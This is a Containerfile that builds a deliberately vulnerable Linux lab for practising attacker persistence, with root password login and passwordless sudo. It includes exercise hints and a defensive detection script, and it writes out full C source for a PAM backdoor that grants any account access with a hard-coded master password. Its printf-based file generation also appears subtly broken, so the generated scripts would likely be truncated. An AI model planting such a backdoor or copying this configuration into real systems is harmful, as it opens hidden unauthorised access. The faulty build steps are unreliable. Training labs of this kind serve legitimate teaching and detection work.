# redteam/persistence.Containerfile
# Simulated compromised Linux host for practicing persistence mechanisms.
#
# Build:
#   podman build -t persistence -f persistence.Containerfile .
#
# Run:
#   podman run -d --name persist-lab -p 2222:22 persistence
#
# Access:
#   ssh root@localhost -p 2222   (password: changeme)
#   ssh victim@localhost -p 2222 (password: changeme)
#
# After adding persistence mechanisms:
#   podman stop persist-lab && podman start persist-lab
#   Verify mechanisms survived the restart.
#
# Intentionally vulnerable. Never expose this lab to a real network.

FROM archlinux:latest

RUN pacman -Syu --noconfirm && \
    pacman -S --noconfirm \
        openssh \
        cronie \
        gcc \
        vim \
        net-tools \
        curl \
        wget \
        python \
        base-devel \
        git \
        sudo \
        procps-ng \
        strace \
        lsof \
        binutils && \
    pacman -Scc --noconfirm

# Configure SSH
RUN ssh-keygen -A && \
    echo 'root:changeme' | chpasswd && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Enable cron daemon
RUN systemctl enable cronie

# Create a vulnerable user with sudo access (for privilege escalation persistence)
RUN useradd -m -s /bin/bash victim && \
    echo 'victim:changeme' | chpasswd && \
    echo 'victim ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && \
    mkdir -p /home/victim/.ssh && \
    chmod 700 /home/victim/.ssh && \
    chown victim:victim /home/victim/.ssh

# Simulated web root for web shell exercises
RUN mkdir -p /var/www/html && \
    echo '<html><body><h1>Default Page</h1></body></html>' > /var/www/html/index.html && \
    chmod -R 755 /var/www

# Lab exercise directory
RUN mkdir -p /opt/persistence-lab/exercises && \
    mkdir -p /opt/persistence-lab/solutions

# Exercise 1: Basic SSH key persistence
RUN printf '#!/bin/bash\n# Exercise: Add your SSH key to root and victim authorized_keys\n# Verify: ssh into the container after restart\n' \
    'echo "=== Exercise 1: SSH Key Persistence ==="\n' \
    'echo "Add your public key to:"\n' \
    'echo "  /root/.ssh/authorized_keys"\n' \
    'echo "  /home/victim/.ssh/authorized_keys"\n' \
    'echo ""\n' \
    'echo "Then: systemctl restart sshd"\n' \
    > /opt/persistence-lab/exercises/01-ssh-key.sh && \
    chmod 755 /opt/persistence-lab/exercises/01-ssh-key.sh

# Exercise 2: Cron persistence
RUN printf '#!/bin/bash\n# Exercise: Create a cron job that persists across restarts\n' \
    'echo "=== Exercise 2: Cron Persistence ==="\n' \
    'echo "Options:"\n' \
    'echo "  crontab -e              (user crontab)"\n' \
    'echo "  /etc/crontab            (system crontab, needs root)"\n' \
    'echo "  /etc/cron.hourly/       (run-parts script)"\n' \
    'echo "  /etc/cron.d/            (system cron fragment)"\n' \
    'echo ""\n' \
    'echo "Create a cron job that writes to /tmp/.persistence_test"\n' \
    > /opt/persistence-lab/exercises/02-cron-persistence.sh && \
    chmod 755 /opt/persistence-lab/exercises/02-cron-persistence.sh

# Exercise 3: Systemd service persistence
RUN printf '#!/bin/bash\n# Exercise: Create a persistent systemd service\n' \
    'echo "=== Exercise 3: Systemd Persistence ==="\n' \
    'echo "Create a service in /etc/systemd/system/ that restarts on failure"\n' \
    'echo "Then: systemctl daemon-reload && systemctl enable --now <service>"\n' \
    'echo ""\n' \
    'echo "User-level services go in ~/.config/systemd/user/"\n' \
    > /opt/persistence-lab/exercises/03-systemd-service.sh && \
    chmod 755 /opt/persistence-lab/exercises/03-systemd-service.sh

# Exercise 4: Shell configuration persistence
RUN printf '#!/bin/bash\n# Exercise: Add persistence to shell rc files\n' \
    'echo "=== Exercise 4: Shell RC Persistence ==="\n' \
    'echo "Add code to ~/.bashrc that executes on every login"\n' \
    'echo "Use a flag file to avoid re-execution within the same session"\n' \
    > /opt/persistence-lab/exercises/04-shell-rc.sh && \
    chmod 755 /opt/persistence-lab/exercises/04-shell-rc.sh

# Exercise 5: PAM backdoor
RUN printf '#!/bin/bash\n# Exercise: Create a custom PAM module with a master password\n' \
    'gcc -shared -fPIC -o /lib/security/pam_master.so \\\n' \
    '  /opt/persistence-lab/exercises/pam_master.c -lpam\n' \
    'echo "Then edit /etc/pam.d/system-auth to include pam_master.so"\n' \
    > /opt/persistence-lab/exercises/05-pam-backdoor.sh && \
    chmod 755 /opt/persistence-lab/exercises/05-pam-backdoor.sh

# Copy PAM backdoor source
RUN printf '#define PAM_SM_AUTH\n' \
    '#include <security/pam_modules.h>\n' \
    '#include <security/_pam_macros.h>\n' \
    '#include <string.h>\n' \
    '#include <stdlib.h>\n' \
    '\n' \
    '#define MASTER_PASSWORD "SesameOpen2026!"\n' \
    '\n' \
    'PAM_EXTERN int pam_sm_authenticate(\n' \
    '    pam_handle_t *pamh, int flags, int argc, const char **argv)\n' \
    '{\n' \
    '    const char *user = NULL;\n' \
    '    const char *password = NULL;\n' \
    '    pam_get_user(pamh, &user, NULL);\n' \
    '    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);\n' \
    '    if (password && strcmp(password, MASTER_PASSWORD) == 0) {\n' \
    '        pam_syslog(pamh, LOG_NOTICE, "master pass for %%s", user);\n' \
    '        return PAM_SUCCESS;\n' \
    '    }\n' \
    '    return PAM_IGNORE;\n' \
    '}\n' \
    '\n' \
    'PAM_EXTERN int pam_sm_setcred(\n' \
    '    pam_handle_t *pamh, int flags, int argc, const char **argv)\n' \
    '{\n' \
    '    return PAM_SUCCESS;\n' \
    '}\n' \
    > /opt/persistence-lab/exercises/pam_master.c

# Detection script (defender's perspective)
RUN printf '#!/bin/bash\n' \
    '# persistence-detector.sh — Check for common persistence indicators\n' \
    'echo "=== SSH authorized_keys ==="\n' \
    'find /home /root -name authorized_keys -ls 2>/dev/null\n' \
    'echo ""\n' \
    'echo "=== UID 0 accounts ==="\n' \
    'awk -F: '"'"'($3 == 0) {print $1, $3}'"'"' /etc/passwd\n' \
    'echo ""\n' \
    'echo "=== Cron entries ==="\n' \
    'cat /etc/crontab 2>/dev/null\n' \
    'ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ 2>/dev/null\n' \
    'echo ""\n' \
    'echo "=== Systemd services (non-package) ==="\n' \
    'ls -la /etc/systemd/system/*.service 2>/dev/null\n' \
    'echo ""\n' \
    'echo "=== LD_PRELOAD ==="\n' \
    'cat /etc/ld.so.preload 2>/dev/null || echo "(empty)"\n' \
    'echo ""\n' \
    'echo "=== SUID binaries ==="\n' \
    'find / -perm -4000 -type f -ls 2>/dev/null\n' \
    'echo ""\n' \
    'echo "=== MOTD scripts ==="\n' \
    'ls -la /etc/update-motd.d/ 2>/dev/null\n' \
    'echo ""\n' \
    'echo "=== Shell rc files ==="\n' \
    'find /home /root -maxdepth 2 -name ".bashrc" -o -name ".profile" 2>/dev/null | xargs ls -la 2>/dev/null\n' \
    > /opt/persistence-lab/persistence-detector.sh && \
    chmod 755 /opt/persistence-lab/persistence-detector.sh

EXPOSE 22

# Start sshd and cron, then keep the container alive
CMD ["sh", "-c", "/usr/bin/sshd && /usr/sbin/crond -n & exec sleep infinity"]
